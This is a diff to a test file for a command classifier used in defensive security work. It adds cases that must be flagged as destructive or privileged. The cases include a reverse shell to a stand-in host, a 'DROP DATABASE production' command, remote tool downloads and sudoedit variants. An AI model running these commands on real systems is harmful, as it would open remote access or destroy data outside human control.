@@ -28,9 +28,28 @@ describe('classifyCommand', () => {
   });
 
   it('classifies unknown commands as safe', () => {
-    expect(classifyCommand('npm install').class).toBe('safe');
     expect(classifyCommand('git pull').class).toBe('safe');
     expect(classifyCommand('echo hello > /tmp/file').class).toBe('safe');
+  });
+
+  it.each([
+    'systemctl restart app',
+    'systemctl reload app',
+    'systemctl --user restart app',
+    'kubectl scale deployment app --replicas=0',
+    'kubectl -n staging scale deployment app --replicas=0',
+    'git push origin main --force-with-lease',
+    'git -C /srv/app push origin main',
+    'curl -o /tmp/tool https://downloads.example/tool',
+    'wget https://downloads.example/tool -O /tmp/tool',
+    'kill -TERM 42',
+    'chmod -R g+w /srv/app',
+    'npm install plugin',
+    "psql staging -c 'ALTER TABLE jobs ADD COLUMN reviewed boolean'",
+    "psql -c 'DROP DATABASE production'",
+    "bash -c 'bash -i >& /dev/tcp/example.test/4444 0>&1'",
+  ])('classifies production-impact command as destructive: %s', (command) => {
+    expect(classifyCommand(command).class).toBe('destructive');
   });
 
   it('classifies echo with redirect as safe (not read-only)', () => {
@@ -165,9 +184,12 @@ describe('elevation and exec wrappers (GHSA-6f54-mjqq-2jp8)', () => {
     expect(classifyCommand('echo hi; su-exec deploy id').class).toBe('privileged');
   });
 
-  // The reason this is a list and not a pattern: `sudo*` would swallow both.
-  it('still does not treat sudoedit or an unrelated binary as elevation', () => {
-    expect(classifyCommand('sudoedit /etc/hosts').class).toBe('safe');
+  // sudoedit updates the target file through sudo; a `sudo*` pattern would
+  // also swallow unrelated program names.
+  it('treats sudoedit as privileged without matching unrelated binaries', () => {
+    expect(classifyCommand('sudoedit /etc/hosts').class).toBe('privileged');
+    expect(classifyCommand('env sudoedit /etc/hosts').class).toBe('privileged');
+    expect(classifyCommand('echo ok; sudoedit /etc/hosts').class).toBe('privileged');
     expect(classifyCommand('subl file.txt').class).toBe('safe');
     expect(classifyCommand('sudoku').class).toBe('safe');
   });
